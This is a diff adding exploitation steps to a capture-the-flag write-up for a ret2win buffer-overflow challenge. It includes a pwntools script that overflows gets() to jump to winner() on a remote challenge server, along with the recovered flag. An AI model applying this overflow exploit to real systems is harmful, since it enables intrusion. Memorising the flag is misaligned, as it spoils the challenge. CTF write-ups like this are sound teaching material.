@@ -65,13 +65,17 @@ Partial RELRO (some sections of the binary are read only, preventing them from b
 
 > RESULT
 
-![image](https://user-images.githubusercontent.com/70703371/209469384-032f4017-bd9d-4755-bff2-4e60b5265c84.png)
+![image](https://user-images.githubusercontent.com/70703371/209469676-7f32d029-9e29-4992-8d04-595a7ccf0221.png)
 
 
 12. Based from the decompiled binary we got, the vuln is at the `gets()` function.
 13. Notice there's a function named `winner()`.
 
 ![image](https://user-images.githubusercontent.com/70703371/209469428-a99621bc-4522-4f3c-9b18-65a419ea11c4.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/209469656-afe9be66-2a62-46f1-a886-c0ad14f48bf7.png)
+
 
 
 14. The concept here is ret2win, we can control the return address to the `winner()` function by overflow the buffer.
@@ -88,5 +92,48 @@ Partial RELRO (some sections of the binary are read only, preventing them from b
 > THE SCRIPT
 
 ```py
+from pwn import *
+import os
 
+os.system('clear')
+context.log_level = 'debug'
+sh = remote('206.189.28.76',30687)
+p = b'A' * 48
+winAddr = 4198918 #0x401206
+p += p64(winAddr)
+sh.sendlineafter(b': ', p)
+sh.interactive()
+```
+
+18. When i ran the script, i didn't get the flag, i think the padding bytes is incorrect.
+19. When i add another 4 bytes, it's still, but when i add more 4 bytes (total 8 bytes added).
+20. I got the flag.
+
+> THE CORRECT PADDING BYTES - 56
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+context.log_level = 'debug'
+sh = remote('206.189.28.76',30687)
+p = b'A' * 56
+winAddr = 4198918 #0x401206
+p += p64(winAddr)
+sh.sendlineafter(b': ', p)
+sh.interactive()
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/209469851-78320b70-54f0-4fe9-aedc-0ba8b378f3c5.png)
+
+
+21. Got the flag!
+
+## FLAG
+
+```
+HTB{N3W_70_pWn}
 ```
